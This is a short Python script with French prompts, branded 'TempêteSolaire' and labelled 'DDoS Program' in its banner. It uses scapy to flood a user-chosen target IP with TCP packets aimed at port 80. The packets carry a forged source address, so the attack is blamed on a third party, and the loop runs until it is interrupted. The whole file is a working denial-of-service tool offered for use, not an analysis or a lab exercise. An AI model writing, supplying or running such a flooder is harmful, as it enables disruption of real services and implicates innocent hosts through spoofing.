import os
from termcolor import colored
from scapy.all import *

prompt = "{~(TempêteSolaire)~} ~~> "
envoyes = 1

#Message (TCP Payload secret)
def DDoS(source, cible):
	coucheIP = IP(src=source, dst=cible)
	coucheTCP = TCP(sport=4444, dport = 80)
	paquet = coucheIP/coucheTCP
	send(paquet, verbose=False)

def main():
	global envoyes

	os.system("clear")
	print(colored(banner,"grey", "on_yellow"))

	fausse_source = input(prompt+"Entrez l'IP qui sera considérée comme attaquante: ")
	cible = input(prompt+"Entrez l'IP de la cible: ")

	print(colored(prompt+"Attaque en cours sur l'IP "+cible+"...","green"))
	print(colored(prompt+"[CTRL+C] Pour arrêter l'attaque.\n", "magenta"))
	while True:
		DDoS(fausse_source,cible)
		envoyes+=1
		if envoyes%100==0:
			print(colored(prompt+str(envoyes)+" paquets actuellement envoyés.", "yellow"))

banner=("                                                                                                                              \n"+
"    ▄████████  ▄██████▄   ▄█          ▄████████    ▄████████    ▄████████     ███      ▄██████▄     ▄████████   ▄▄▄▄███▄▄▄▄   \n"+
"   ███    ███ ███    ███ ███         ███    ███   ███    ███   ███    ███ ▀█████████▄ ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄ \n"+
"   ███    █▀  ███    ███ ███         ███    ███   ███    ███   ███    █▀     ▀███▀▀██ ███    ███   ███    ███ ███   ███   ███ \n"+
"   ███        ███    ███ ███         ███    ███  ▄███▄▄▄▄██▀   ███            ███   ▀ ███    ███  ▄███▄▄▄▄██▀ ███   ███   ███ \n"+
" ▀███████████ ███    ███ ███       ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████     ███     ███    ███ ▀▀███▀▀▀▀▀   ███   ███   ███ \n"+
"          ███ ███    ███ ███         ███    ███ ▀███████████          ███     ███     ███    ███ ▀███████████ ███   ███   ███ \n"+
"    ▄█    ███ ███    ███ ███▌    ▄   ███    ███   ███    ███    ▄█    ███     ███     ███    ███   ███    ███ ███   ███   ███ \n"+
"  ▄████████▀   ▀██████▀  █████▄▄██   ███    █▀    ███    ███  ▄████████▀     ▄████▀    ▀██████▀    ███    ███  ▀█   ███   █▀  \n"+
"                         ▀                        ███    ███                                       ███    ███                 \n"+
"                                                                                                                              \n"+
"                                                 DDoS Program by b64-Sm9yZGFuIExBSVJFUw                                                \n"+
"                                                                                                                              \n")

main()

